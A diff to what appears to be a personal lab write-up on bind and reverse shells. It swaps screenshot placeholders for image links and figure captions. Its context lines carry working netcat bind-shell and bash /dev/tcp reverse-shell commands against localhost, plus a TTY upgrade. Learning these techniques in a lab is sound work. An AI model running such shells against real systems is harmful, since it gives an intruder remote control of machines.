@@ -29,9 +29,14 @@ nc -nvlp 4444 -e /bin/bash
 nc 127.0.0.1 4444
 ```
 
-**[SCREENSHOT — victim terminal: nc -nvlp 4444 listening and receiving connection]**
+<img width="389" height="121" alt="image" src="https://github.com/user-attachments/assets/dfbda52d-55e3-44db-a796-5c2e63ad43a9" />
+ 
 
-**[SCREENSHOT — attacker terminal: id command output with full uid/groups]**
+**[Fig 1: Victim terminal: nc -nvlp 4444 listening and receiving connection]**
+
+<img width="620" height="120" alt="image" src="https://github.com/user-attachments/assets/8362dde5-5251-4b90-afa0-969fcf842b57" />
+
+**[Fig 2: Attacker terminal: id command output with full uid/groups]**
 
 ---
 
@@ -47,15 +52,21 @@ bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
 
 **Important — zsh doesn't support /dev/tcp.** My default shell is zsh and running the command directly in zsh fails with `no such file or directory`. Always invoke bash explicitly with `bash -c '...'`.
 
-**[SCREENSHOT — zsh error: no such file or directory: /dev/tcp/127.0.0.1/4444]**
+<img width="614" height="79" alt="image" src="https://github.com/user-attachments/assets/52288478-e388-42d0-b1b6-101a81de356c" />
+
+**[Fig 3: zsh error: no such file or directory: /dev/tcp/127.0.0.1/4444]**
 
 Once you call bash explicitly it works:
 
-**[SCREENSHOT — both terminals: listener got connection, victim ran bash -c command]**
+<img width="1318" height="123" alt="image" src="https://github.com/user-attachments/assets/4477155f-83dc-4259-9a39-05c009cca5e0" />
+
+**[Fig 4: both terminals: listener got connection, victim ran bash -c command]**
 
 Running commands through the reverse shell:
 
-**[SCREENSHOT — id and whoami responses coming back through the shell]**
+<img width="641" height="182" alt="Screenshot 2026-04-28 134821" src="https://github.com/user-attachments/assets/6b51e850-a19f-43b1-a02d-bc7e7c9f5ca6" />
+
+**[Fig 5: id and whoami responses coming back through the shell]**
 
 ---
 
@@ -76,17 +87,19 @@ stty raw -echo; fg
 export TERM=xterm
 ```
 
-**Mistake I made:** ran the python3 command in my local terminal instead of inside the reverse shell. Got `hostnamepython3: command not found`. The pty spawn has to run where the shell landed — inside the nc listener terminal.
+**Mistake I made:** ran the python3 command in my local terminal instead of inside the reverse shell. Got `hostnamepython3: command not found`. The pty spawn has to run where the shell landed, inside the nc listener terminal.
 
-**[SCREENSHOT — hostnamepython3: command not found error]**
+<img width="459" height="352" alt="image" src="https://github.com/user-attachments/assets/23335498-7562-4af4-8e26-cd10fcee1769" />
+
+**[Fig 6: hostnamepython3: command not found error]**
 
 ---
 
 ## Key Takeaways
 
-- Reverse shells over bind shells — always
-- `/dev/tcp` is bash-only — zsh, sh, and dash don't support it
-- Raw nc shells are not interactive — always upgrade with python3 pty
+- Reverse shells over bind shells bro, always🙃
+- `/dev/tcp` is bash-only; zsh, sh, and dash don't support it
+- Raw nc shells are not interactive, therefore always upgrade with python3 pty
 - TTY upgrade commands go inside the reverse shell, not your local terminal
 
 ---
